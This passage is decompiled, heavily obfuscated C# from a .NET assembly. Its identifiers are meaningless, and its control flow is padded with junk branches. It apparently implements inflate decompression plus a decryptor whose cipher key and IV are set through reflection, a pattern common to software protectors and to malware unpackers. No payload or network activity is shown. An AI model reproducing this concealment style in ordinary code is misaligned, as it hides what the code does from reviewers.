      void* voidPtr = (void*) __untypedstackalloc(12);
      switch (obj0.\u0005)
      {
        case 2:
          if (obj0.\u000F)
          {
            obj0.\u0005 = 12;
            return false;
          }
          *(int*) voidPtr = \u0081.\u0002\u0016\u0007(obj0.\u0010, 3);
          if (*(int*) voidPtr < 0)
            return false;
          break;
        case 3:
          if ((obj0.\u000E = \u0081.\u0002\u0016\u0007(obj0.\u0010, 16)) >= 0)
          {
            \u0081.\u0001\u0017\u0007(obj0.\u0010, 16);
            goto label_18;
          }
          else
            goto label_15;
        case 4:
label_19:
          *(int*) ((IntPtr) voidPtr + 4) = \u0081.\u0002\u0016\u0007(obj0.\u0010, 16);
          int num1 = *(int*) ((IntPtr) voidPtr + 4);
          if (false)
            return num1 != 0;
          if (num1 < 0)
          {
            if (true)
              return false;
            goto case 3;
          }
          else
            goto label_23;
        case 5:
label_24:
          *(int*) ((IntPtr) voidPtr + 8) = \u0081.\u001B\u0014\u0007(obj0.\u0011, obj0.\u0010, obj0.\u000E);
          obj0.\u000E -= *(int*) ((IntPtr) voidPtr + 8);
          if (obj0.\u000E != 0)
            return !\u0081.\u0012\u0018\u0007(obj0.\u0010);
          obj0.\u0005 = 2;
          if (true)
            return true;
          break;
        case 6:
          if (!\u0081.\u008E\u0016\u0007(obj0.\u0012, obj0.\u0010))
            return false;
          obj0.\u0013 = \u0081.\u008C\u0017\u0007(obj0.\u0012);
          obj0.\u0014 = \u0081.\u001A\u0014\u0007(obj0.\u0012);
          obj0.\u0005 = 7;
          goto case 7;
        case 7:
        case 8:
        case 9:
        case 10:
          return \u0081.\u009B\u0014\u0007(obj0);
        case 12:
          return false;
        default:
          return false;
      }
      \u0081.\u0001\u0017\u0007(obj0.\u0010, 3);
      if ((*(int*) voidPtr & 1) != 0)
        obj0.\u000F = true;
      int num2 = *(int*) voidPtr;
label_6:
      switch (num2 >> 1)
      {
        case 0:
          \u0081.\u009E\u0016\u0007(obj0.\u0010);
          obj0.\u0005 = 3;
          break;
        case 1:
          obj0.\u0013 = \u000E.\u0013.\u0002;
          obj0.\u0014 = \u000E.\u0013.\u0003;
          obj0.\u0005 = 7;
          if (true)
          {
            if (true)
            {
              if (false)
                goto label_23;
              else
                break;
            }
            else
              goto label_15;
          }
          else
            goto label_18;
        case 2:
          obj0.\u0012 = new \u000E.\u0014();
          obj0.\u0005 = 6;
          break;
      }
      return true;
label_15:
      int num3 = 0;
      if (num3 == 0)
        return num3 != 0;
      num2 = num3;
      goto label_6;
label_18:
      obj0.\u0005 = 4;
      goto label_19;
label_23:
      \u0081.\u0001\u0017\u0007(obj0.\u0010, 16);
      obj0.\u0005 = 5;
      goto label_24;
    }

    static void \u009E\u0016\u0007([In] \u000E.\u0011 obj0)
    {
      obj0.\u0004 >>= obj0.\u0005 & 7;
      obj0.\u0005 &= -8;
    }

    static void \u0004\u0015\u0007([In] \u000E.\u0012 obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
      if (false)
        return;
      while (true)
      {
        int num1 = obj2;
        int num2;
        while (true)
        {
          num2 = num1 - 1;
          if (false)
            num1 = num2;
          else
            break;
        }
        obj2 = num2;
        if (num1 > 0)
        {
          byte[] numArray = obj0.\u0001;
          \u000E.\u0012 obj = obj0;
          int num3;
          int num4 = num3 = obj.\u0002;
          obj.\u0002 = num3 + 1;
          int index = num4;
          int num5 = (int) obj0.\u0001[obj1++];
          numArray[index] = (byte) num5;
          obj0.\u0002 &= (int) short.MaxValue;
          int num6 = obj1;
          if (true)
            num6 &= (int) short.MaxValue;
          obj1 = num6;
        }
        else
          break;
      }
    }

    static short \u008A\u0015\u0007([In] int obj0) => (short) ((int) \u000E.\u0015.\u0002[obj0 & 15] << 12 | (int) \u000E.\u0015.\u0002[obj0 >> 4 & 15] << 8 | (int) \u000E.\u0015.\u0002[obj0 >> 8 & 15] << 4 | (int) \u000E.\u0015.\u0002[obj0 >> 12]);

    static void \u008B\u0017\u0007([In] \u0008 obj0)
    {
      do
      {
        if (true)
          goto label_3;
label_2:
        continue;
label_3:
        obj0.\u0001.GetMethod("Clear").Invoke(obj0.\u0002, new object[0]);
        goto label_2;
      }
      while (false);
    }

    static unsafe bool \u009B\u0014\u0007([In] \u000E.\u000F obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      int num1 = \u0081.\u008E\u0017\u0007(obj0.\u0011);
      while (true)
      {
        int index1;
        while (num1 >= 258)
        {
          *(int*) ((IntPtr) voidPtr + 8) = obj0.\u0005;
          switch (*(int*) ((IntPtr) voidPtr + 8))
          {
            case 7:
              int num2 = \u0081.\u000E\u0015\u0007(obj0.\u0013, obj0.\u0010);
              if (true)
              {
                index1 = num2;
                int num3;
                for (int index2 = num2 & -256; index2 == 0; index2 = num3)
                {
                  \u0081.\u0011\u0015\u0007(obj0.\u0011, index1);
                  num3 = num1;
                  if (true)
                  {
                    if ((num1 = num3 - 1) < 258)
                      return true;
                    goto case 7;
                  }
                }
                int num4 = index1;
                num2 = 257;
                num2 = num4;
              }
              if (num2 < num2)
              {
                if (index1 < 0)
                  return false;
                obj0.\u0014 = (\u000E.\u0013) null;
                obj0.\u0013 = (\u000E.\u0013) null;
                obj0.\u0005 = 2;
                return true;
              }
              obj0.\u0007 = \u000E.\u000F.\u0001[index1 - 257];
              obj0.\u0006 = \u000E.\u000F.\u0002[index1 - 257];
              goto case 8;
            case 8:
              if (obj0.\u0006 > 0)
              {
                obj0.\u0005 = 8;
                if (true)
                {
                  *(int*) voidPtr = \u0081.\u0002\u0016\u0007(obj0.\u0010, obj0.\u0006);
                  if (*(int*) voidPtr < 0)
                    return false;
                  \u0081.\u0001\u0017\u0007(obj0.\u0010, obj0.\u0006);
                  obj0.\u0007 += *(int*) voidPtr;
                }
                else
                  goto label_21;
              }
              obj0.\u0005 = 9;
              goto case 9;
            case 9:
              index1 = \u0081.\u000E\u0015\u0007(obj0.\u0014, obj0.\u0010);
              goto label_20;
            case 10:
              goto label_23;
            default:
              continue;
          }
        }
        goto label_29;
label_20:
        if (index1 >= 0)
        {
          obj0.\u0008 = \u000E.\u000F.\u0003[index1];
          obj0.\u0006 = \u000E.\u000F.\u0004[index1];
        }
        else
          break;
label_23:
        if (obj0.\u0006 > 0)
        {
          obj0.\u0005 = 10;
          *(int*) ((IntPtr) voidPtr + 4) = \u0081.\u0002\u0016\u0007(obj0.\u0010, obj0.\u0006);
          if (*(int*) ((IntPtr) voidPtr + 4) >= 0)
          {
            \u0081.\u0001\u0017\u0007(obj0.\u0010, obj0.\u0006);
            obj0.\u0008 += *(int*) ((IntPtr) voidPtr + 4);
          }
          else
            goto label_25;
        }
        \u0081.\u0015\u0015\u0007(obj0.\u0011, obj0.\u0007, obj0.\u0008);
        num1 -= obj0.\u0007;
        obj0.\u0005 = 7;
        continue;
label_29:
        if (false)
          goto label_20;
        else
          goto label_30;
      }
label_21:
      return false;
label_25:
      return false;
label_30:
      return true;
    }

    static unsafe int \u0084\u0016\u0007([In] int obj0, [In] \u000E.\u000F obj1, [In] int obj2, [In] byte[] obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      *(int*) voidPtr = 0;
      int num1;
      int num2;
      do
      {
        num1 = obj1.\u0005;
        num2 = 11;
        if (num2 != 0)
        {
          if (num1 != num2)
            goto label_8;
label_3:
          if (!\u0081.\u0018\u0014\u0007(obj1))
          {
            int num3 = obj1.\u0011.\u0003;
            num2 = 0;
            num1 = num3;
            goto label_5;
          }
          else
            continue;
label_8:
          *(int*) ((IntPtr) voidPtr + 4) = \u0081.\u000F\u0018\u0007(obj2, obj3, obj1.\u0011, obj0);
          obj0 += *(int*) ((IntPtr) voidPtr + 4);
          *(int*) voidPtr = *(int*) voidPtr + *(int*) ((IntPtr) voidPtr + 4);
          obj2 -= *(int*) ((IntPtr) voidPtr + 4);
          if (obj2 != 0)
            goto label_3;
          else
            goto label_2;
        }
label_5:;
      }
      while (num1 > num2 && obj1.\u0005 != 11);
      goto label_6;
label_2:
      return *(int*) voidPtr;
label_6:
      return *(int*) voidPtr;
    }

    static int \u0098\u0017\u0007([In] \u000E.\u0011 obj0)
    {
      int num1 = obj0.\u0003;
      int num2;
      int num3;
      while (true)
      {
        num2 = obj0.\u0002;
        if (true)
        {
          num3 = num1 - num2;
          if (false)
            num1 = num3;
          else
            goto label_7;
        }
        else
          break;
      }
label_2:
      do
      {
        if (true)
          num2 >>= 3;
      }
      while (false);
      return num1 + num2;
label_7:
      num2 = obj0.\u0005;
      num1 = num3;
      goto label_2;
    }

    static int \u0096\u0015\u0007([In] \u000E.\u0011 obj0) => obj0.\u0005;

    static ICryptoTransform \u009C\u0016\u0007(
      [In] byte[] obj0,
      [In] bool obj1,
      [In] byte[] obj2,
      [In] \u0006 obj3)
    {
      obj3.\u0001.GetProperty("Key").GetSetMethod().Invoke(obj3.\u0002, new object[1]
      {
        (object) obj0
      });
      obj3.\u0001.GetProperty("IV").GetSetMethod().Invoke(obj3.\u0002, new object[1]
      {
        (object) obj2
      });
      return (ICryptoTransform) obj3.\u0001.GetMethod(obj1 ? "CreateDecryptor" : "CreateEncryptor", new System.Type[0]).Invoke(obj3.\u0002, new object[0]);
    }

    static unsafe int \u000E\u0015\u0007([In] \u000E.\u0013 obj0, [In] \u000E.\u0011 obj1)
    {
      int num1;
      void* voidPtr;
      if (true)
      {
        int num2 = 16;
        int index;
        int num3;
        while (true)
        {
          // ISSUE: untyped stack allocation
          voidPtr = (void*) __untypedstackalloc(num2);
          if ((index = \u0081.\u0002\u0016\u0007(obj1, 9)) >= 0)
          {
            if ((num1 = (int) obj0.\u0001[index]) >= 0)
            {
              if (true)
              {
                \u0081.\u0001\u0017\u0007(obj1, num1 & 15);
                num3 = num1;
                if (false)
                  num2 = num3;
                else
                  break;
              }
              else
                goto label_8;
            }
            else
              goto label_5;
          }
          else
            goto label_13;
        }
        return num3 >> 4;
label_5:
        *(int*) voidPtr = -(num1 >> 4);
        *(int*) ((IntPtr) voidPtr + 4) = num1 & 15;
        int num4;
        if ((num4 = \u0081.\u0002\u0016\u0007(obj1, *(int*) ((IntPtr) voidPtr + 4))) >= 0)
        {
          int num5 = (int) obj0.\u0001[*(int*) voidPtr | num4 >> 9];
          \u0081.\u0001\u0017\u0007(obj1, num5 & 15);
          return num5 >> 4;
        }
        *(int*) ((IntPtr) voidPtr + 8) = obj1.\u0005;
        index = \u0081.\u0002\u0016\u0007(obj1, *(int*) ((IntPtr) voidPtr + 8));
        num1 = (int) obj0.\u0001[*(int*) voidPtr | index >> 9];
label_8:
        if (true)
        {
          if ((num1 & 15) > *(int*) ((IntPtr) voidPtr + 8))
            return -1;
          \u0081.\u0001\u0017\u0007(obj1, num1 & 15);
          if (true)
            return num1 >> 4;
          goto label_14;
        }
        else
          goto label_16;
label_13:
        *(int*) ((IntPtr) voidPtr + 12) = obj1.\u0005;
        index = \u0081.\u0002\u0016\u0007(obj1, *(int*) ((IntPtr) voidPtr + 12));
label_14:
        num1 = (int) obj0.\u0001[index];
      }
      if (num1 < 0)
        goto label_18;
label_16:
      if ((num1 & 15) <= *(int*) ((IntPtr) voidPtr + 12))
      {
        \u0081.\u0001\u0017\u0007(obj1, num1 & 15);
        return num1 >> 4;
      }
label_18:
      return -1;
    }

    static int \u008C\u0014\u0007([In] \u000E.\u0012 obj0) => obj0.\u0003;
  }
}
